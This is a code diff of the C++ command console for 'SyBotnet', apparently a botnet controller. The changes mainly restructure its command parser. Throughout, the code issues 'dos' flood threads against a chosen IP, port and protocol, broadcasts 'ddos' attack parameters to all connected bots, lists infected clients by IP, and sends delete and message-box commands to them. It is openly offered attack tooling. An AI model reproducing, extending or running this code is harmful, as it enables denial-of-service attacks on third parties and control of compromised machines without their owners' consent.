@@ -53,7 +53,7 @@ void print_help()
 	std::cout << "  > list  [s]         show client list             \n";
 	std::cout << "                                                   \n";
 	std::cout << "  [s] : safe          [w] : warning                \n";
-	std::cout << "                                                   \n\n";
+	std::cout << "                                                   \n";
 }
 
 bool check_number(const std::string& target)
@@ -82,7 +82,7 @@ std::vector<std::string> split(const std::string& target, char split)
 
 int main()
 {
-
+	
 	SetConsoleTitleW(L"SyBotnet");
 
 	std::cout << " Loding Server ... \n ";
@@ -109,186 +109,189 @@ int main()
 
 		std::vector<std::string> result = split(command_string, ' ');
 
-		strcpy(data.command, result[0].c_str());
-
 		std::cout << '\n';
 
-		if (result[0] == "help") {
-			print_help();
-		}
-
-		else if (result[0] == "del")
+		if (result.size() > 0)
 		{
-			for (int i = 0; i < result.size(); i++)
-			{
-				if (result[i] == "-i" || result[i] == "--id")
-				{
+			strcpy(data.command, result[0].c_str());
 
-					if (atoi(result[i + 1].c_str()) < result.size()) {
-						tcp.Send(reinterpret_cast<char*>(&data), sizeof(Data), atoi(result[i + 1].c_str()));
+			if (result[0] == "help") {
+				print_help();
+			}
+
+			else if (result[0] == "del")
+			{
+				for (int i = 0; i < result.size(); i++)
+				{
+					if (result[i] == "-i" || result[i] == "--id")
+					{
+
+						if (atoi(result[(i + 1)].c_str()) < result.size()) {
+							tcp.Send(reinterpret_cast<char*>(&data), sizeof(Data), atoi(result[(i + 1)].c_str()));
+							break;
+						}
+					}
+					else if (result[i] == "-a" || result[i] == "--all")
+					{
+						for (int id = 0; id < tcp.GetTotalAccept(); id++) {
+							tcp.Send(reinterpret_cast<char*>(&data), sizeof(Data), id);
+						}
 						break;
 					}
 				}
-				else if (result[i] == "-a" || result[i] == "--all")
-				{
-					for (int id = 0; id < tcp.GetTotalAccept(); id++) {
-						tcp.Send(reinterpret_cast<char*>(&data), sizeof(Data), id);
-					}
-					break;
-				}
 			}
-		}
 
-		else if (result[0] == "clean") {
-			std::system("cls");
-		}
+			else if (result[0] == "clean") {
+				std::system("cls");
+			}
 
-		else if (result[0] == "list")
-		{
-			int client_count = 0;
-
-			std::cout << " Client List \n";
-
-			for (int id = 0; id < tcp.GetTotalAccept(); id++)
+			else if (result[0] == "list")
 			{
-				tcp.Ping(id);
+				int client_count = 0;
 
-				if (tcp.Ping(id) != E_SEND)
+				std::cout << " Client List \n";
+
+				for (int id = 0; id < tcp.GetTotalAccept(); id++)
 				{
-					std::cout << " | ID " << id << " IP " << tcp.GetClientIP(id) << '\n';
-					client_count++;
-				}
-			}
+					tcp.Ping(id);
 
-			if (client_count == 0) {
-				std::cout << " | Don't have client, alone :( \n";
-			}
-			else {
-				std::cout << " Total: " << tcp.GetTotalAccept() << " bots \n";
-				std::cout << " Online: " << client_count << " bots \n";
-			}
-		}
-		else if (result[0] == "dos")
-		{
-			for (int argc = 1; argc < (result.size() - 1); argc++)
-			{
-				if (result[argc] == "-i" || result[argc] == "--ip") {
-					strcpy(data.ip, result[(argc + 1)].c_str());
-				}
-
-				else if (result[argc] == "-p" || result[argc] == "--port" || result[argc] == "--packet" || result[argc] == "--protocol")
-				{
-					if (check_number(result[(argc + 1)]) == true) {
-						data.port = atoi(result[(argc + 1)].c_str());
-					}
-					else 
+					if (tcp.Ping(id) != E_SEND)
 					{
-						if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
-							strcpy(data.proto, result[(argc + 1)].c_str());
-						}
-						else {
-							strcpy(data.packet, result[(argc + 1)].c_str());
-						}
+						std::cout << " | ID " << id << " IP " << tcp.GetClientIP(id) << '\n';
+						client_count++;
 					}
 				}
 
-				else if (result[argc] == "-d" || result[argc] == "--delay") {
-					data.delay = atoi(result[(argc + 1)].c_str());
+				if (client_count == 0) {
+					std::cout << " | Don't have client, alone :( \n";
 				}
-
-				else if (result[argc] == "-th" || result[argc] == "--thread") {
-					data.thread = atoi(result[(argc + 1)].c_str());
-				}
-
-				else if (result[argc] == "-t" || result[argc] == "--time") {
-					data.time = atoi(result[(argc + 1)].c_str());
+				else {
+					std::cout << " Total: " << tcp.GetTotalAccept() << " bots \n";
+					std::cout << " Online: " << client_count << " bots \n";
 				}
 			}
-
-			for (int i = 0; i < data.thread; i++) {
-				std::thread(flood, data).detach();
-			}
-		}
-
-		else if (result[0] == "ddos")
-		{
-			for (int argc = 1; argc < (result.size() - 1); argc++)
+			else if (result[0] == "dos")
 			{
-				if (result[argc] == "-i" || result[argc] == "--ip") {
-					strcpy(data.ip, result[(argc + 1)].c_str());
-				}
-
-				else if (result[argc] == "-p" || result[argc] == "--port" || result[argc] == "--packet" || result[argc] == "--protocol")
+				for (int argc = 1; argc < (result.size() - 1); argc++)
 				{
-					if (check_number(result[(argc + 1)]) == true) {
-						data.port = atoi(result[(argc + 1)].c_str());
+					if (result[argc] == "-i" || result[argc] == "--ip") {
+						strcpy(data.ip, result[(argc + 1)].c_str());
 					}
-					else
+
+					else if (result[argc] == "-p" || result[argc] == "--port" || result[argc] == "--packet" || result[argc] == "--protocol")
 					{
-						if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
-							strcpy(data.proto, result[(argc + 1)].c_str());
+						if (check_number(result[(argc + 1)]) == true) {
+							data.port = atoi(result[(argc + 1)].c_str());
 						}
-						else {
-							strcpy(data.packet, result[(argc + 1)].c_str());
+						else
+						{
+							if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
+								strcpy(data.proto, result[(argc + 1)].c_str());
+							}
+							else {
+								strcpy(data.packet, result[(argc + 1)].c_str());
+							}
 						}
+					}
+
+					else if (result[argc] == "-d" || result[argc] == "--delay") {
+						data.delay = atoi(result[(argc + 1)].c_str());
+					}
+
+					else if (result[argc] == "-th" || result[argc] == "--thread") {
+						data.thread = atoi(result[(argc + 1)].c_str());
+					}
+
+					else if (result[argc] == "-t" || result[argc] == "--time") {
+						data.time = atoi(result[(argc + 1)].c_str());
 					}
 				}
 
-				else if (result[argc] == "-d" || result[argc] == "--delay") {
-					data.delay = atoi(result[(argc + 1)].c_str());
-				}
-
-				else if (result[argc] == "-th" || result[argc] == "--thread") {
-					data.thread = atoi(result[(argc + 1)].c_str());
-				}
-
-				else if (result[argc] == "-t" || result[argc] == "--time") {
-					data.time = atoi(result[(argc + 1)].c_str());
+				for (int i = 0; i < data.thread; i++) {
+					std::thread(flood, data).detach();
 				}
 			}
 
-			for (int id = 0; id < tcp.GetTotalAccept(); id++) {
-				tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
-			}
-		}
-
-		else if (result[0] == "msgbox")
-		{
-			int id = 0;
-			bool is_id = false;
-
-			for (int i = 0; i < result.size(); i++)
+			else if (result[0] == "ddos")
 			{
-				if (result[i] == "-t" || result[i] == "--text") {
-					strcpy(data.first_option, result[(i + 1)].c_str());
+				for (int argc = 1; argc < (result.size() - 1); argc++)
+				{
+					if (result[argc] == "-i" || result[argc] == "--ip") {
+						strcpy(data.ip, result[(argc + 1)].c_str());
+					}
+
+					else if (result[argc] == "-p" || result[argc] == "--port" || result[argc] == "--packet" || result[argc] == "--protocol")
+					{
+						if (check_number(result[(argc + 1)]) == true) {
+							data.port = atoi(result[(argc + 1)].c_str());
+						}
+						else
+						{
+							if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
+								strcpy(data.proto, result[(argc + 1)].c_str());
+							}
+							else {
+								strcpy(data.packet, result[(argc + 1)].c_str());
+							}
+						}
+					}
+
+					else if (result[argc] == "-d" || result[argc] == "--delay") {
+						data.delay = atoi(result[(argc + 1)].c_str());
+					}
+
+					else if (result[argc] == "-th" || result[argc] == "--thread") {
+						data.thread = atoi(result[(argc + 1)].c_str());
+					}
+
+					else if (result[argc] == "-t" || result[argc] == "--time") {
+						data.time = atoi(result[(argc + 1)].c_str());
+					}
 				}
 
-				else if (result[i] == "-c" || result[i] == "--caption") {
-					strcpy(data.second_option, result[(i + 1)].c_str());
-				}
-
-				else if (result[i] == "-i" || result[i] == "--id") {
-					is_id = true;
-					id = atoi(result[i + 1].c_str());
-				}
-
-				else if (result[i] == "--id--all") {
-					is_id = false;
-				}
-			}
-
-			if (!is_id)
-			{
-				for (id = 0; id < tcp.GetTotalAccept(); id++) {
+				for (int id = 0; id < tcp.GetTotalAccept(); id++) {
 					tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
 				}
 			}
-			else {
-				tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
-			}
-		}
 
-		std::cout << '\n';
+			else if (result[0] == "msgbox")
+			{
+				int id = 0;
+				bool is_id = false;
+
+				for (int i = 0; i < result.size(); i++)
+				{
+					if (result[i] == "-t" || result[i] == "--text") {
+						strcpy(data.first_option, result[(i + 1)].c_str());
+					}
+
+					else if (result[i] == "-c" || result[i] == "--caption") {
+						strcpy(data.second_option, result[(i + 1)].c_str());
+					}
+
+					else if (result[i] == "-i" || result[i] == "--id") {
+						is_id = true;
+						id = atoi(result[i + 1].c_str());
+					}
+
+					else if (result[i] == "--id--all") {
+						is_id = false;
+					}
+				}
+
+				if (!is_id)
+				{
+					for (id = 0; id < tcp.GetTotalAccept(); id++) {
+						tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
+					}
+				}
+				else {
+					tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
+				}
+			}
+
+			std::cout << '\n';
+		}
 	}
 
 	return 0;
